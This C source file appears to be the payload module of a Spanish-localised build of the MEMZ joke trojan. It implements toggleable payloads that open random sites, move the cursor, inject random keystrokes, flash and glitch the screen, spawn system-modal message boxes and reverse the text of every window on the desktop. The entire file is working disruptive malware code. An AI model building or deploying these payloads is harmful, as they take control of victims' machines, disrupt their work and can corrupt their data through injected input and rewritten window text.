#include "memz.h"

PAYLOAD payloads[] = {
	{ payloadExecute, L"Abrir paginas/programas random", NULL, 0, 0, 0, 0, FALSE },
	{ payloadCursor, L"Movimiento random del cursor", NULL, 0, 0, 0, 0, TRUE },
	{ payloadKeyboard, L"Input random del teclado", NULL, 0, 0, 0, 0, FALSE },
	{ payloadSound, L"Sonidos de error random", NULL, 0, 0, 0, 0, TRUE },
	{ payloadBlink, L"Pantalla parpadeante", NULL, 0, 0, 0, 0, TRUE },
	{ payloadMessageBox, L"Mensajes", NULL, 0, 0, 0, 0, TRUE },
	{ payloadDrawErrors, L"Dibujar iconos de error", NULL, 0, 0, 0, 0, TRUE },
	{ payloadChangeText, L"Texto al reves", NULL, 0, 0, 0, 0, FALSE },
	{ payloadPIP, L"Efecto tunel", NULL, 0, 0, 0, 0, TRUE },
	{ payloadPuzzle, L"Glitches de pantalla", NULL, 0, 0, 0, 0, TRUE }
};

const size_t nPayloads = sizeof(payloads) / sizeof(PAYLOAD);
BOOLEAN enablePayloads = TRUE;

DWORD WINAPI payloadThread(LPVOID parameter) {

	PAYLOAD *payload = (PAYLOAD*)parameter;

	for (;;) {
		if (enablePayloads && SendMessage(payload->btn, BM_GETCHECK, 0, NULL) == BST_CHECKED) {
			if (payload->delaytime++ >= payload->delay) {
				payload->delay = (payload->payloadFunction)(payload->times++, payload->runtime, FALSE);
				payload->delaytime = 0;
			}

			payload->runtime++;
		} else {
			 payload->runtime = 0;
			 payload->times = 0;
			 payload->delay = 0;
		}

		Sleep(10);
	}
}

int payloadExecute(PAYLOADFUNC) {
	PAYLOADHEAD

	ShellExecuteA(NULL, "open", (LPCSTR)sites[random() % nSites], NULL, NULL, SW_SHOWDEFAULT);

	out: return 1500.0 / (times / 15.0 + 1) + 100 + (random() % 200);
}

int payloadBlink(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	BitBlt(hdc, 0, 0, rekt.right - rekt.left, rekt.bottom - rekt.top, hdc, 0, 0, NOTSRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 100;
}

int payloadCursor(PAYLOADFUNC) {
	PAYLOADHEAD

	POINT cursor;
	GetCursorPos(&cursor);

	SetCursorPos(cursor.x + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)), cursor.y + (random() % 3 - 1) * (random() % (runtime / 2200 + 2)));

	out: return 2;
}

int payloadMessageBox(PAYLOADFUNC) {
	PAYLOADHEAD

	CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);

	out: return 2000.0 / (times / 8.0 + 1) + 20 + (random() % 30);
}

DWORD WINAPI messageBoxThread(LPVOID parameter) {
	HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
	MessageBoxW(NULL, L"Sigues usando esta computadora?", L"xd", MB_SYSTEMMODAL | MB_OK | MB_ICONWARNING);
	UnhookWindowsHookEx(hook);

	return 0;
}

LRESULT CALLBACK msgBoxHook(int nCode, WPARAM wParam, LPARAM lParam) {
	if (nCode == HCBT_CREATEWND) {
		CREATESTRUCT *pcs = ((CBT_CREATEWND *)lParam)->lpcs;

		if ((pcs->style & WS_DLGFRAME) || (pcs->style & WS_POPUP)) {
			HWND hwnd = (HWND)wParam;

			int x = random() % (scrw - pcs->cx);
			int y = random() % (scrh - pcs->cy);

			pcs->x = x;
			pcs->y = y;
		}
	}

	return CallNextHookEx(0, nCode, wParam, lParam);
}

int payloadChangeText(PAYLOADFUNC) {
	PAYLOADHEAD
	EnumChildWindows(GetDesktopWindow(), &EnumChildProc, NULL);

	out: return 50;
}

BOOL CALLBACK EnumChildProc(HWND hwnd, LPARAM lParam) {
	LPWSTR str = (LPWSTR)GlobalAlloc(GMEM_ZEROINIT, sizeof(WCHAR) * 8192);

	if (SendMessageTimeoutW(hwnd, WM_GETTEXT, 8192, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL)) {
		strReverseW(str);
		SendMessageTimeoutW(hwnd, WM_SETTEXT, NULL, (LPARAM)str, SMTO_ABORTIFHUNG, 100, NULL);
	}
	
	GlobalFree(str);

	return TRUE;
}

int payloadSound(PAYLOADFUNC) {
	PAYLOADHEAD

	// There seems to be a bug where toggling ALL payloads kills the sound output on some systems.
	// I don't know why this happens, but using SND_SYNC seems to fix the bug.
	// But the sound is not not as fast as before. I hope there is another way to fix it without slowing down the payload.
	// As this only happens for the enable-disable part, I will only include that in the clean build as a workaround.

	PlaySoundA(sounds[random() % nSounds], GetModuleHandle(NULL), SND_SYNC);
	out: return random() % 10;
}

int payloadPuzzle(PAYLOADFUNC) {
	PAYLOADHEAD
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);

	int x1 = random() % (rekt.right - 100);
	int y1 = random() % (rekt.bottom - 100);
	int x2 = random() % (rekt.right - 100);
	int y2 = random() % (rekt.bottom - 100);
	int width = random() % 600;
	int height = random() % 600;

	BitBlt(hdc, x1, y1, width, height, hdc, x2, y2, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 3;
}

int payloadKeyboard(PAYLOADFUNC) {
	PAYLOADHEAD

	INPUT input;

	input.type = INPUT_KEYBOARD;
	input.ki.wVk = (random() % (0x5a - 0x30)) + 0x30;
	SendInput(1, &input, sizeof(INPUT));

	out: return 300 + (random() % 400);
}

int payloadPIP(PAYLOADFUNC) {
	PAYLOADHEAD

	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);
	RECT rekt;
	GetWindowRect(hwnd, &rekt);
	StretchBlt(hdc, 50, 50, rekt.right - 100, rekt.bottom - 100, hdc, 0, 0, rekt.right, rekt.bottom, SRCCOPY);
	ReleaseDC(hwnd, hdc);

	out: return 200.0 / (times / 5.0 + 1) + 4;
}

int payloadDrawErrors(PAYLOADFUNC) {
	PAYLOADHEAD

	int ix = GetSystemMetrics(SM_CXICON) / 2;
	int iy = GetSystemMetrics(SM_CYICON) / 2;
	
	HWND hwnd = GetDesktopWindow();
	HDC hdc = GetWindowDC(hwnd);

	POINT cursor;
	GetCursorPos(&cursor);

	DrawIcon(hdc, cursor.x - ix, cursor.y - iy, LoadIcon(NULL, IDI_ERROR));

	if (random() % (int)(10/(times/500.0+1)+1) == 0) {
		DrawIcon(hdc, random()%scrw, random()%scrh, LoadIcon(NULL, IDI_WARNING));
	}
	
	ReleaseDC(hwnd, hdc);

	out: return 2;
}